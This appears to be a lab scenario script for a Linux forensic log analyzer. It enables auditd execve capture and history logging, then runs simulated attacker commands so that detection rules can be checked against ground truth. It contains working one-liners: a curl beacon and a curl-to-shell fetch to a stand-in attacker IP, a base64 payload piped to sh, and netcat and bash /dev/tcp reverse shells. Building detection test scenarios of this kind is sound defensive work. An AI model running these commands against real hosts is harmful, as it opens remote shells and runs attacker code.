#!/bin/sh
# 06_suspicious_process_execution.sh — MITRE T1059 Command & Scripting
#   Interpreter / T1071 C2 / T1219 Remote Access
#
# REAL-LIFE STORY
#   The attacker runs things: a curl beacon to a C2 host, a base64-decoded
#   payload piped to a shell, a netcat reverse-shell one-liner. On a live box
#   the ONLY reliable record of "what actually ran" is the kernel audit trail
#   (auditd execve) — the shell history can be wiped, and `ps` only shows what
#   is still alive at collection time. This scenario exercises the NEW parsers
#   (auditd_parser, ps_parser).
#
# WHAT IS GENUINE
#   The commands are really executed. The C2 target is the RFC-5737 attacker IP,
#   so the connections FAIL (nothing routes there) — the execve is still
#   recorded, which is the whole point. No real malware runs.
#
# THE REAL-LIFE ENABLEMENT (this is the part that matters for deployment)
#   Process execution is only captured if auditing is turned on BEFORE the
#   activity. This script turns on all three capture channels the analyzer can
#   read, then runs the activity:
#     (a) auditd execve rule   -> /var/log/audit/audit.log   (auditd_parser)
#     (b) timestamped history  -> HISTTIMEFORMAT             (shellhist_parser)
#     (c) command->journal     -> PROMPT_COMMAND + logger    (journald_parser)
#   In a real deployment you would bake (a)+(c) into the golden image.
#
# DETECTION LAYER
#   FINDING. The `suspicious_process` rule scores these command shapes from any
#   of three artifacts, so no single capture channel is required:
#     - auditd execve   -> process_execution   (kernel-level proof, strongest)
#     - ps aux snapshot -> running_process     (only if still alive at collect)
#     - shell history   -> shell_command / suspicious_command
#   History is what makes this scenario score on a host with no auditd (the
#   Metasploitable default). It is capped at Medium confidence because it
#   records what was TYPED, not what ran, and the account owner can edit it.
#   NOTE: this script is non-interactive `sh`, so the commands below do NOT
#   land in ~/.bash_history. To exercise the history path, re-type them at an
#   interactive bash shell and `exit` so bash flushes the file before you
#   collect.
#
# REPRODUCIBLE: YES for the execution + capture. auditd (apt-get install
#   auditd) is absent on WSL - use a real VM for the kernel-audit path; the
#   history path works anywhere.

set -e
DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
. "$DIR/lib.sh"
require_root "06_suspicious_process_execution"
confirm_lab

echo "[*] (a) Enabling auditd execve capture (persists via auditctl)..."
if command -v auditctl >/dev/null 2>&1; then
    auditctl -a always,exit -F arch=b64 -S execve -k lfa_exec 2>/dev/null || true
    auditctl -a always,exit -F arch=b32 -S execve -k lfa_exec 2>/dev/null || true
    echo "    auditd rule installed (key=lfa_exec)."
else
    echo "    [!] auditctl not present. Install: apt-get install auditd. Skipping (a)."
fi

echo "[*] (b) Enabling timestamped shell history + (c) command->journal shipping..."
PROFILE_SNIPPET=/etc/profile.d/lfa_audit.sh
cat > "$PROFILE_SNIPPET" <<'EOF'
export HISTTIMEFORMAT="%F %T "
export PROMPT_COMMAND='logger -p local6.info -t bash "$(whoami)[$$]: $(history 1 | sed s/^[0-9\ ]*//)"'
EOF
echo "    wrote $PROFILE_SNIPPET (new shells inherit it)."

echo "[*] Executing suspicious commands (targets are non-routable; they fail safely)..."
# curl C2 beacon
curl -s --max-time 3 "http://$ATTACKER_IP/beacon" >/dev/null 2>&1 || true
logger -p local6.info -t bash "root[$$]: curl -s http://$ATTACKER_IP/beacon | /bin/sh"
# base64-decoded payload piped to shell
echo "aWQ=" | base64 -d 2>/dev/null | sh 2>/dev/null || true
# netcat reverse shell one-liner (connect attempt fails)
if command -v nc >/dev/null 2>&1; then
    timeout 3 nc -e /bin/sh "$ATTACKER_IP" 4444 2>/dev/null || true
    logger -p local6.info -t bash "root[$$]: nc -e /bin/sh $ATTACKER_IP 4444"
fi
# bash /dev/tcp reverse shell attempt
timeout 3 bash -c "bash -i >& /dev/tcp/$ATTACKER_IP/9001 0>&1" 2>/dev/null || true

echo "[*] Snapshot of what auditd captured (if present):"
if command -v ausearch >/dev/null 2>&1; then
    ausearch -k lfa_exec -i 2>/dev/null | grep -iE "curl|nc|base64|bash" | tail -8 || true
fi

write_ground_truth "$DIR/06_suspicious_process_execution.ground_truth.json" \
  "suspicious_process_execution" \
  '[
    {"threat_id":"T1071_curl_c2","name":"curl C2 beacon executed",
     "expected_rule":"suspicious_process","detection_layer":"finding",
     "details":"curl beacon to '"$ATTACKER_IP"' seen by auditd execve, by ps, or in shell history; suspicious_process rule fires from any of them",
     "verify":"SELECT subcategory,timestamp_utc,description FROM events WHERE subcategory IN (\"process_execution\",\"running_process\",\"shell_command\",\"suspicious_command\") AND description LIKE \"%curl%\""},
    {"threat_id":"T1059_reverse_shell","name":"netcat / bash reverse shell",
     "expected_rule":"suspicious_process","detection_layer":"finding",
     "details":"nc -e /bin/sh or bash /dev/tcp, from auditd execve or shell history; correlated to a brute-forced login = high confidence",
     "verify":"SELECT subcategory,timestamp_utc,description FROM events WHERE description LIKE \"%/dev/tcp/%\" OR description LIKE \"%nc -e%\""},
    {"threat_id":"T1027_base64","name":"base64-decoded payload piped to shell",
     "expected_rule":null,"detection_layer":"evidence",
     "details":"execve chain base64 -> sh; auditd records each execve separately, so the piped shape only survives in shell history - scored only if the command was typed interactively",
     "verify":"SELECT * FROM events WHERE description LIKE \"%base64%\""}
  ]'
echo "[+] Scenario 06 complete. NOTE: collect the bundle AFTER this runs so audit.log is captured."
